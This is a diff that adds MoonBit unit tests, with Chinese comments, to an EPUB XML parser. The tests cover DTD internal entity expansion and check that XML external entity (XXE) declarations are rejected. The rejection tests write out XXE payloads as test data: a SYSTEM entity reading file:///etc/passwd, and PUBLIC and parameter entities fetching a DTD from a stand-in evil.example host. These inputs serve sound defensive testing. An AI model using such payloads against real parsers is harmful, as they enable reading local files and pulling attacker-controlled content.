@@ -445,3 +445,116 @@ test "辅助函数与属性内实体" {
     msg="属性引号未闭合应报错",
   )
 }
+
+///|
+/// EPUB 3.3「XML conformance」：内部 DTD 实体是合法输入，必须按语义展开。
+test "DOCTYPE 内部实体：标题与属性按语义展开" {
+  let xml = @util.join_nl([
+    "<?xml version=\"1.0\" encoding=\"utf-8\"?>", "<!DOCTYPE package [", "  <!ENTITY booktitle \"月亮与六便士\">",
+    "  <!ENTITY author \"毛姆\">", "  <!ENTITY lang \"zh\">", "]>", "<package xmlns:dc=\"http://purl.org/dc/elements/1.1/\">",
+    "  <dc:title xml:lang=\"&lang;\">&booktitle;</dc:title>", "  <dc:creator>&author;</dc:creator>",
+    "</package>",
+  ])
+  match @xml.parse_document(xml) {
+    Err(_) => panic()
+    Ok(root) => {
+      match @xml.find_child(root, "title") {
+        None => panic()
+        Some(t) => {
+          assert_true(
+            @xml.text_content(t) == "月亮与六便士",
+            msg="内部实体标题展开：" + @xml.text_content(t),
+          )
+          assert_true(
+            @xml.attr_or_empty(t, "lang") == "zh",
+            msg="属性值中的内部实体展开：" +
+              @xml.attr_or_empty(t, "lang"),
+          )
+        }
+      }
+      match @xml.find_child(root, "creator") {
+        None => panic()
+        Some(c) =>
+          assert_true(
+            @xml.text_content(c) == "毛姆",
+            msg="内部实体作者展开",
+          )
+      }
+    }
+  }
+}
+
+///|
+/// 内部实体值可再含实体引用，按 XML 规则递归展开。
+test "DOCTYPE 内部实体：嵌套引用递归展开" {
+  let xml = @util.join_nl([
+    "<!DOCTYPE a [", "  <!ENTITY who \"世界\">", "  <!ENTITY greeting \"你好，&who;！\">",
+    "]>", "<a><p>&greeting;</p></a>",
+  ])
+  match @xml.parse_document(xml) {
+    Err(_) => panic()
+    Ok(root) =>
+      assert_true(
+        @xml.text_content(root) == "你好，世界！",
+        msg="嵌套展开：" + @xml.text_content(root),
+      )
+  }
+}
+
+///|
+/// 规范 MUST NOT：internal DTD subset 不得含 external entity declaration。
+test "DOCTYPE 外部实体：按 EPUB 规范拒绝" {
+  let sys = @util.join_nl([
+    "<!DOCTYPE a [", "  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">", "]>", "<a>&xxe;</a>",
+  ])
+  let pub_ext = @util.join_nl([
+    "<!DOCTYPE a [", "  <!ENTITY xxe PUBLIC \"-//EVIL//DTD\" \"http://evil.example/x.dtd\">",
+    "]>", "<a>&xxe;</a>",
+  ])
+  assert_true(
+    doc_err_text(sys).contains("禁止外部实体声明"),
+    msg="SYSTEM 外部实体应报错：" + doc_err_text(sys),
+  )
+  assert_true(
+    doc_err_text(pub_ext).contains("禁止外部实体声明"),
+    msg="PUBLIC 外部实体应报错：" + doc_err_text(pub_ext),
+  )
+  assert_true(
+    lenient_err_text(sys).contains("禁止外部实体声明"),
+    msg="lenient 模式也不放宽 XXE 禁令",
+  )
+}
+
+///|
+/// 参数实体与循环引用都要在解析阶段挡住，不 panic。
+test "DOCTYPE 参数实体与循环引用被拒绝" {
+  let param = @util.join_nl([
+    "<!DOCTYPE a [", "  <!ENTITY % ext SYSTEM \"http://evil.example/x.dtd\">", "]>",
+    "<a/>",
+  ])
+  let cyclic = @util.join_nl([
+    "<!DOCTYPE a [", "  <!ENTITY loop \"&loop;\">", "]>", "<a>&loop;</a>",
+  ])
+  assert_true(
+    doc_err_text(param).contains("禁止参数实体声明"),
+    msg="参数实体应报错",
+  )
+  // 自引用实体在入表前展开，严格模式按「未声明」拒绝——同样安全、不 panic
+  assert_true(
+    doc_err_text(cyclic).length() > 0,
+    msg="循环实体应被拒绝：" + doc_err_text(cyclic),
+  )
+}
+
+///|
+/// 外部标识符的 DOCTYPE（EPUB 规范允许）不应被误判为外部实体。
+test "DOCTYPE 外部标识符仍可解析" {
+  let xml = @util.join_nl([
+    "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.1//EN\"", "  \"http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd\">",
+    "<html><body><p>ok</p></body></html>",
+  ])
+  assert_true(
+    doc_ok(xml),
+    msg="外部标识符 DOCTYPE 合法：" + doc_err_text(xml),
+  )
+}
